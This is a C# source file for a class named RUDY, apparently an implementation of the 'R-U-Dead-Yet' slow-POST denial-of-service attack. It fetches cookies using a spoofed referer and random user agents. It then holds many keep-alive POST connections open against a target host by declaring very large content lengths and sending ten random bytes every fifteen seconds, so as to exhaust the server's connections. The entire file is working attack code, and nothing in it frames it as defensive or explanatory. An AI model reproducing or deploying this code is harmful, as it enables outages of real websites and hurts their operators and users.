using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

    class RUDY
    {
        public static string Host;
        public static bool IsEnabled;
        public static int requestsPerThread = 10;
        public static int interval = 15000;

        public static CookieContainer CookieJar;

        public static void GrabCookies()
        {
            try
            {
                CookieJar = new CookieContainer();
                HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(Host);
                request.ContentType = "application/x-www-form-urlencoded";
                request.Referer = "http://www.google.com/";
                request.UserAgent = Tools.GenerateRandomUserAgent();
                request.CookieContainer = CookieJar;
                
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            }
            catch { }
        }

        public static void WorkerThread()
        {
            List<HttpWebRequest> connectionList = new List<HttpWebRequest>();
            Stream tempStream;
            Random randLength = new Random(DateTime.Now.Millisecond);

            for (int i = 0; i <= requestsPerThread - 1; i++)
            {
                HttpWebRequest tempReq = (HttpWebRequest)HttpWebRequest.Create(Host);
                tempReq.UserAgent = Tools.GenerateRandomUserAgent();
                tempReq.CookieContainer = CookieJar;
                tempReq.Method = WebRequestMethods.Http.Post;
                tempReq.KeepAlive = true;
                tempReq.ContentLength = randLength.Next(20000000, 100000000);
                tempReq.ServicePoint.ConnectionLimit = 10000;

                connectionList.Add(tempReq);
            }

            while (IsEnabled)
            {
                for (int i = 0; i <= requestsPerThread - 1; i++)
                {
                    try
                    {
                        tempStream = connectionList[i].GetRequestStream();
                        tempStream.Write(Tools.GenerateRandomPacket(10), 0, 10);
                    }
                    catch { }
                }
                Thread.Sleep(interval);
                GC.Collect();
            }
        }
    }
